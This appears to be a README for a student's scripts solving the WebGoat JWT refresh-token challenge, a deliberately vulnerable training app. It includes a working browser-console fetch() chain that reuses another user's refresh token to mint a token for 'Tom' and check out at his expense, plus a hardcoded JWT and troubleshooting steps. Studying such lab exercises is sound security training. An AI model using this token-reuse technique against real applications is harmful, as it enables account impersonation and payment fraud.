JWT REFRESH TOKEN ATTACK - ULTRA CLEAN SCRIPTS
================================================

NO EMOJI, NO SPECIAL UNICODE CHARACTERS
GUARANTEED TO WORK IN BROWSER CONSOLE

TWO-STEP PROCESS:
=================

STEP 1: GET FRESH REFRESH TOKEN
--------------------------------
Copy and paste this entire file into browser console:
c:\webgoat-scripts-1\get_fresh_token_ULTRA_CLEAN.js

What it does:
- Searches page HTML for refresh_token
- Tries to get token from server
- If fails, gives manual instructions

Expected output:
[FOUND in HTML] Refresh token: 4a9a0b1e...
[OK] Saved to window.myRefreshToken


STEP 2: EXECUTE THE ATTACK
---------------------------
Copy and paste this entire file into browser console:
c:\webgoat-scripts-1\jwt_refresh_ULTRA_CLEAN.js

What it does:
1. Takes Tom's expired token
2. Uses Jerry's fresh refresh token
3. Gets NEW token for Tom
4. Checkouts as Tom
5. Tom pays $31.53!

Expected output:
[SUCCESS] Got response!
[VERIFIED] Token belongs to TOM!
SUCCESS! CHALLENGE COMPLETED!


MANUAL BACKUP METHOD:
=====================

If scripts don't work, do this manually:

1. GET FRESH REFRESH TOKEN:
   - Open DevTools Network tab (F12)
   - Click "Checkout" button on page
   - Find request to /JWT/refresh/checkout
   - In Response, find "refresh_token": "..."
   - Copy the long hex string
   - In console, run:
     window.myRefreshToken = "PASTE_YOUR_TOKEN_HERE"

2. EXECUTE ATTACK:
   - In console, run:

const TOMS_TOKEN = 'eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q';

fetch('/WebGoat/JWT/refresh/newToken', {
    method: 'POST',
    headers: {
        'Authorization': 'Bearer ' + TOMS_TOKEN,
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({refresh_token: window.myRefreshToken})
})
.then(r => r.json())
.then(data => {
    window.tomsNewToken = data.access_token;
    console.log('Got Toms token!');
    return fetch('/WebGoat/JWT/refresh/checkout', {
        method: 'POST',
        headers: {'Authorization': 'Bearer ' + window.tomsNewToken}
    });
})
.then(r => r.json())
.then(data => console.log('Result:', data));


TROUBLESHOOTING:
================

ERROR: Uncaught SyntaxError: illegal character
FIX: Make sure you copy from ULTRA_CLEAN files only

ERROR: 401 Unauthorized on refresh
FIX: Your refresh token is expired, get a fresh one (Step 1)

ERROR: window.myRefreshToken is undefined
FIX: Run get_fresh_token_ULTRA_CLEAN.js first

ERROR: Nothing happens when pasting
FIX: Make sure you're on http://192.168.254.112:8001/WebGoat/start.mvc
     Navigate to Challenges > A5 JWT Tokens > JWT Refresh Token


FILES CREATED:
==============
jwt_refresh_ULTRA_CLEAN.js - Main attack script (NO special chars)
get_fresh_token_ULTRA_CLEAN.js - Token retrieval (NO special chars)
JWT_REFRESH_ULTRA_CLEAN_README.txt - This file


NEXT CHALLENGE AFTER THIS:
===========================
Challenge 3: "Buy Samsung Phone for Free" (Final Endpoints)
Challenge 4: "Find Flag in Photo Comments" (Final Endpoints)
